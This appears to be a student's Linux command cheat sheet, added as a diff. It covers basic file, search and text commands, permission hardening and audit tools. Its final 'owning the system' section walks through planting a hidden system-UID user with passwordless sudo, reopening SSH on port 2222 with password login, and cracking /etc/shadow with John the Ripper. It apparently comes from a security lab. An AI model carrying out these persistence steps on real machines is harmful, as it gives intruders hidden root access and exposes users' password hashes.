@@ -1,0 +1,330 @@
+﻿Create multiple directories
+$ mkdir <file name>, <file name>, <file name>
+
+
+Remove a directory
+$ rmdir <directory name in current directory or directory with filepath>
+
+
+Change directory 
+$ cd <file path>
+
+
+Display current working directory (print working directory)
+$ pwd
+
+
+List directory contents
+$ ls
+
+
+Display text that are passed as argument
+$ echo “<text>”
+
+
+Create an empty txt file
+$ touch <file name>
+
+
+Remove a file
+$ rm  <file name in current directory or filepath>
+
+
+Move up a directory
+$ cd ..
+
+
+Move up two directories
+$ cd ../../
+
+
+Move file (without duplicating)
+$ mv <file name> <file path>
+
+
+Copy a file (duplicating)
+$ cp <file name> <file path>
+
+
+Clear terminal history of a page
+$ clear
+
+
+Print one file’s contents to screen
+$ cat <file name in current directory>
+
+
+Print one file’s contents to new file
+$ cat <file name in current directory>><file name> 
+
+
+Print two file’s contents to screen
+$ cat <file name in current directory> <file name in current directory>
+
+
+Print cat results of two files to a combined file
+$ cat <file name in current directory> <file name in current directory> > <combined file name>
+
+
+        If combined file already exists, it will overwrite file
+
+
+Print cat results to append to a file
+$ cat <file name in current directory> <file name in current directory> >> <combined file name>
+
+
+View a file one page at a time. Space bar moves you to the next page
+$ more <file name>
+
+
+Also view a file’s contents, but with scroll up and down capability
+$ less <file name>
+
+
+Display the top 10 lines of a file
+$ head <file name>
+
+
+Display the bottom 10 lines of a file
+$ tail <file name>
+
+
+Display specified number of lines of a file
+$ head -<number> <file name>
+ex. head -50 log.txt
+
+
+Open file in Nano text editor
+$ nano <file name>
+
+
+Create a bash script in nano editor:
+#!/bin/bash
+
+
+<commands>
+
+
+Make text files executable 
+$ chmod +x <txt filename>
+
+
+Run executable sh file in current directory
+$ ./<filename.sh>
+
+
+Search for a word in a file or directory of files
+$ grep <search term--case sensitive by default> <filepath>
+Display instructions for the grep command
+$ man grep
+grep (search) for term in one file 
+$ grep <search term> <filename>
+grep (search) for term in multiple files
+$ grep <search term> <file1> <file2> <file3>
+grep (search) recursively for the search term in all files in a directory tree
+$ grep -r <search term>
+grep (search) for the word 'inet' from the output of the "ip addr show" command
+$ ip addr show | grep inet
+grep (search) for the word 'Master' ignoring case
+$ grep -i Master
+
+
+Find command syntax:
+find option argument -exec command {} \;
+where:
+* option is a find option (e.g. -iname)
+* argument is the filename(s)
+* exec option - exec
+* command is a unix command (e.g., cp, mv)
+* {} indicates where in the command line to read in each file found
+* ; ends the line (the \ escapes the ;) 
+* Ex: find all files and then output the text I found file {file path}
+   * $ find -type f -exec echo "I found file" '{}' \; | more
+   * I found file ./tmp/tempfile
+Word Count: prints the number of lines, words, and characters in a text file.
+$ wc <options> <filename>
+Display instructions for the wc command
+$ man wc
+Display the number of lines, words and characters in the index.html file
+$ wc <filename>
+Display the count for all of the text files within a directory
+$ wc . *
+Display instructions for the find command
+$ man find
+Find all the files and directories in the current tree
+$ find
+List files in a specific directory
+$ find ./demo
+Find a file by name (case sensitive) in the current directory
+$ find  . -name index.html
+Find a file by name (not case sensitive)
+$ find  . -iname index.html
+Find all files in a directory
+$ find  -type f
+Find all directories
+$ find  -type d
+Find all the .txt files
+$ find -type f -name '*.txt'
+Find directories that begin with Demo
+$ find -type d -name 'Demo*'
+Find files that are over 5MB in size
+$ find ~/joe -size +5M
+Find all html files and copy them to the directory /joe
+$ find . -name '*.html' -exec cp '{}' ~/joe/ \;
+
+
+Replacing text in file using sed command
+$ cat <filename> | sed s/<old value>/<replacement value>/
+
+
+Awk syntax:
+awk -F, ‘{print $<field #>}’ <filename>
+where:
+* F is the option for field separator
+* the comma (,) is the delimiter or divider
+* ‘{print $<field #>}’ prints the specific field number
+Ex. where we have a database titled cities.txt with entries in the following format: Phoenix, Utah, USA, the awk command is as follows to retrieve the states from all entries: 
+awk -F, ‘{print $2}’ cities.txt
+Download files from the internet by wget command
+$ wget <url file path>
+
+
+Download files from the internet by curl command
+$ curl <options> <url file path>
+
+
+Run commands with the security privileges of another user
+$ sudo <command>
+
+
+Inspect shadow permissions (Permissions on /etc/shadow should allow only root read and write access)
+$ ls -l shadow (while in /etc directory)
+
+
+Set shadow permissions (if needed)
+$ sudo chmod <ex. 600, determined by binary switches> shadow (while in /etc directory)
+
+
+Inspect group permissions (Permissions on /etc/group should allow root read and write access, and allow everyone else read access only.) 
+$ ls -l group
+
+
+Set group permissions (if needed)
+$ sudo chmod 644 group
+
+
+Inspect password permissions (Permissions on /etc/passwd should allow root read and write access, and allow everyone else read access only.)
+$ ls -l passwd
+
+
+Set password permissions (if needed)
+$ sudo chmod 644 passwd
+
+
+Add user account 
+$ sudo adduser <username>
+
+
+Add sudo access to already created admin account in sudo group
+$ sudo usermod -aG sudo admin
+
+
+Add group to the system
+$ sudo addgroup <groupname ex. engineers, sales>
+
+
+Add already existing user to managed group
+$ sudo usermod -aG <groupname> <username>
+
+
+Install Lynis
+$ sudo apt install lynis
+
+
+Run an audit
+$ sudo lynis audit system
+
+
+Install chkrootkit
+$ sudo apt install chkrootkit
+
+
+See chkrootkit documentation
+$ man chkrootkit
+
+
+Run chkrootkit in expert mode
+$ sudo chkrootkit -x
+
+
+
+
+OWNING THE SYSTEM EXAMPLE
+
+
+Create a secret user without a home folder created
+$ adduser <secret username, ex. sysd> --no-create-home
+
+
+         Give secret user a system UID < 1000
+$ usermod -u 990 <sysd>
+
+
+Give secret user the same group ID (GID)
+$ groupmod -g 990 <sysd>
+
+
+Check if it worked
+$ id sysd
+
+
+Give user full sudo access without the need for a password
+$ visudo
+
+
+* While in /etc/sudoer.tmp file, I entered:
+sysd ALL=(ALL) NOPASSWD:ALL
+
+
+Save and Exit
+
+
+Test if sudo access for secret user worked
+$ sudo su sysd
+$ sudo -l
+
+
+Navigate to the sshd_config file
+$ cd /etc/ssh/
+
+
+Open ssh config file in nano
+$ sudo nano sshd_config
+
+
+                While in nano: 
+add Port 2222, then delete comment for Port 22
+                Change uncommented PasswordAuthentification to Yes
+        
+                Save and Exit
+
+
+Print local IP information
+$ ifconfig
+                Note 192.168.6.105 for attack
+
+
+Restart SSH service
+$ sudo service sshd restart 
+
+
+SSH to target machine from attacker machine:
+$ ssh sysd@192.168.6.105 -p 2222
+
+
+Switch to root user
+$ sudo su root
+
+
+Use John the Ripper to crack entire /etc/shadow file
+$ john /etc/shadow
